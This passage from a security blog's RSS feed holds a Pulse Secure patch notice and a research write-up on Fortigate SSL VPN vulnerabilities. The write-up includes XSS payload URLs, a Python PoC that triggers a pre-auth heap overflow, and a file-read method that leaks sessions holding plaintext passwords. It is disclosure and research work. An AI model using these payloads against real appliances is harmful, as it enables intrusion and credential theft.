  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;目前已經出現攻擊者對全世界設備進行大規模掃描，請 Pulse Secure SSL VPN 用戶&lt;strong&gt;儘速更新&lt;/strong&gt;，需要更新的版本資源可參考&lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101&quot;&gt;原廠 Pulse Secure 的公告&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;細節&quot;&gt;細節&lt;/h3&gt;

&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：
&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;p&gt;目前亦發現攻擊者對我們之前發表的 &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;Fortigate SSL VPN&lt;/a&gt; 及 &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt; 弱點進行大規模掃描，再次提醒請用戶儘速更新以上 SSL VPN 設備至最新版。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory</guid>
                <pubDate>Wed, 28 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN</title>
                <description>&lt;p&gt;Author: Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;) and Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Last month, we talked about &lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto Networks GlobalProtect RCE&lt;/a&gt; as an appetizer. Today, here comes the main dish! If you cannot go to Black Hat or DEFCON for our talk, or you are interested in more details, here is the slides for you!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will also give a speech at the following conferences, just come and find us!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hitcon.org/2019/CMT/agenda&quot;&gt;HITCON&lt;/a&gt; - Aug. 23 @ Taipei (Chinese)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gsec.hitb.org/sg2019/agenda/&quot;&gt;HITB GSEC&lt;/a&gt; - Aug. 29,30 @ Singapore&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.romhack.io/program_en-2019.html&quot;&gt;RomHack&lt;/a&gt; - Sep. 28 @ Rome&lt;/li&gt;
  &lt;li&gt;and more …&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;lets-start&quot;&gt;Let’s start!&lt;/h1&gt;

&lt;p&gt;The story began in last August, when we started a new research project on SSL VPN. Compare to the site-to-site VPN such as the IPSEC and PPTP, SSL VPN is more easy to use and compatible with any network environments. For its convenience, SSL VPN becomes the most popular remote access way for enterprise!&lt;/p&gt;

&lt;p&gt;However, what if this trusted equipment is insecure? It is an important corporate asset but a blind spot of corporation. According to our survey on Fortune 500, the Top-3 SSL VPN vendors dominate about 75% market share. The diversity of SSL VPN is narrow. Therefore, once we find a critical vulnerability on the leading SSL VPN, the impact is huge. There is no way to stop us because SSL VPN must be exposed to the internet.&lt;/p&gt;

&lt;p&gt;At the beginning of our research, we made a little survey on the CVE amount of leading SSL VPN vendors:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems like Fortinet and Pulse Secure are the most secure ones. Is that true? As a myth buster, we took on this challenge and started hacking Fortinet and Pulse Secure! This story is about hacking &lt;strong&gt;Fortigate SSL VPN&lt;/strong&gt;. The next article is going to be about &lt;strong&gt;Pulse Secure&lt;/strong&gt;, which is the most splendid one! Stay tuned!&lt;/p&gt;

&lt;h1 id=&quot;fortigate-ssl-vpn&quot;&gt;Fortigate SSL VPN&lt;/h1&gt;

&lt;p&gt;Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/remote/login&lt;/code&gt;. Here is the technical feature of Fortigate:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;All-in-one binary
  We started our research from the file system. We tried to list the binaries in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/&lt;/code&gt; and found there are all symbolic links, pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/init&lt;/code&gt;. Just like this:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Fortigate compiles all the programs and configurations into a single binary, which makes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init&lt;/code&gt; really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/ls&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/cat&lt;/code&gt;!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Web daemon
  There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/httpsd&lt;/code&gt; on the port 443. The other is normal user interface, handled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sslvpnd&lt;/code&gt; on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.&lt;/p&gt;

    &lt;p&gt;Through our investigation, we found the web server is modified from apache, but it is the apache from 2002. Apparently they modified apache in 2002 and added their own additional functionality. We can map the source code of apache to speed up our analysis.&lt;/p&gt;

    &lt;p&gt;In both web service, they also compiled their own apache modules into the binary to handle each URL path. We can find a table specifying the handlers and dig into them!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;WebVPN
  WebVPN is a convenient proxy feature which allows us connect to all the services simply through a browser. It supports many protocols, like HTTP, FTP, RDP. It can also handle various web resources, such as WebSocket and Flash. To process a website correctly, it parses the HTML and rewrites all the URLs for us. This involves heavy string operation, which is prone to memory bugs.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We found several vulnerabilities:&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379-pre-auth-arbitrary-file-reading&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt;: Pre-auth arbitrary file reading&lt;/h3&gt;
&lt;p&gt;While fetching corresponding language file, it builds the json file path with the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lang&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/migadmin/lang/%s.json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;. According to the man page, it writes &lt;strong&gt;at most size-1&lt;/strong&gt; into the output string. Therefore, we only need to make it exceed the buffer size and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.json&lt;/code&gt; will be stripped. Then we can read whatever we want.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13380-pre-auth-xss&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-383&quot;&gt;CVE-2018-13380&lt;/a&gt;: Pre-auth XSS&lt;/h3&gt;
&lt;p&gt;There are several XSS:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/message?title=x&amp;amp;msg=%26%23&amp;lt;svg/onload=alert(1)&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13381-pre-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-387&quot;&gt;CVE-2018-13381&lt;/a&gt;: Pre-auth heap overflow&lt;/h3&gt;
&lt;p&gt;While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt; and this should occupies 5 bytes. If it encounter anything starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&lt;/code&gt;, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, it consider there is a token already encoded, and count its length directly. Like this:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;(&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;)&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;#&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;amp;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;#&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, there is an inconsistency between length calculation and encoding process. The encode part does not handle that much.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;#60;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we input a malicious string like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&amp;lt;&amp;lt;&amp;lt;;&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is still encoded into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, so the result should be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&amp;amp;#60;&amp;amp;#60;&amp;amp;#60;;&lt;/code&gt;! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&apos;title&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;x&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&apos;msg&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;amp;#&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;https://sslvpn:4433/message&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13382-the-magic-backdoor&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-389&quot;&gt;CVE-2018-13382&lt;/a&gt;: The magic backdoor&lt;/h3&gt;
&lt;p&gt;In the login page, we found a special parameter called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic&lt;/code&gt;. Once the parameter meets a hardcoded string, we can modify any user’s password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;According to our survey, there are still plenty of Fortigate SSL VPN lack of patch. Therefore, considering its severity, we will not disclose the magic string. However, this vulnerability has been &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240&quot;&gt;reproduced by the researcher from CodeWhite&lt;/a&gt;. It is surely that other attackers will exploit this vulnerability soon! Please update your Fortigate ASAP!&lt;/p&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;zh-tw&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Critical vulns in &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; reversed &amp;amp; exploited by our colleagues &lt;a href=&quot;https://twitter.com/niph_?ref_src=twsrc%5Etfw&quot;&gt;@niph_&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/ramoliks?ref_src=twsrc%5Etfw&quot;&gt;@ramoliks&lt;/a&gt; - patch your &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; asap and see the &lt;a href=&quot;https://twitter.com/hashtag/bh2019?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#bh2019&lt;/a&gt; talk of &lt;a href=&quot;https://twitter.com/orange_8361?ref_src=twsrc%5Etfw&quot;&gt;@orange_8361&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/mehqq_?ref_src=twsrc%5Etfw&quot;&gt;@mehqq_&lt;/a&gt; for details (tnx guys for the teaser that got us started) &lt;a href=&quot;https://t.co/TLLEbXKnJ4&quot;&gt;pic.twitter.com/TLLEbXKnJ4&lt;/a&gt;&lt;/p&gt;&amp;mdash; Code White GmbH (@codewhitesec) &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw&quot;&gt;2019年7月2日&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;cve-2018-13383-post-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-388&quot;&gt;CVE-2018-13383&lt;/a&gt;: Post-auth heap overflow&lt;/h3&gt;

&lt;p&gt;This is a vulnerability on the WebVPN feature. While parsing JavaScript in the HTML, it tries to copy content into a buffer with the following code:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The buffer size is fixed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2000&lt;/code&gt;, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.
To trigger this overflow, we need to put our exploit on an HTTP server, and then ask the SSL VPN to proxy our exploit as a normal user.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;The official advisory described no RCE risk at first. Actually, it was a misunderstanding. We will show you how to exploit from the user login interface without authentication.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13381&quot;&gt;CVE-2018-13381&lt;/h3&gt;
&lt;p&gt;Our first attempt is exploiting the pre-auth heap overflow. However, there is a fundamental defect of this vulnerability – It does not overflow Null bytes. In general, this is not a serious problem. The heap exploitation techniques nowadays should overcome this. However, we found it a disaster doing heap feng shui on Fortigate. There are several obstacles, making the heap unstable and hard to be controlled.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Single thread, single process, single allocator
  The web daemon handles multiple connection with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;epoll()&lt;/code&gt;, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.&lt;/li&gt;
  &lt;li&gt;Operations regularly triggered
  This interferes the heap but is uncontrollable. We cannot arrange the heap carefully because it would be destroyed.&lt;/li&gt;
  &lt;li&gt;Apache additional memory management. 
  The memory won’t be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt; until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.&lt;/li&gt;
  &lt;li&gt;JeMalloc
  JeMalloc isolates meta data and user data, so it is hard to modify meta data and play with the heap management. Moreover, it centralizes small objects, which also limits our exploit.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We were stuck here, and then we chose to try another way. If anyone exploits this successfully, please teach us!&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379--cve-2018-13383&quot;&gt;CVE-2018-13379 + CVE-2018-13383&lt;/h3&gt;
&lt;p&gt;This is a combination of pre-auth file reading and post-auth heap overflow. One for gaining authentication and one for getting a shell.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Gain authentication
  We first use CVE-2018-13379 to leak the session file. The session file contains valuable information, such as username and plaintext password, which let us login easily.&lt;/p&gt;

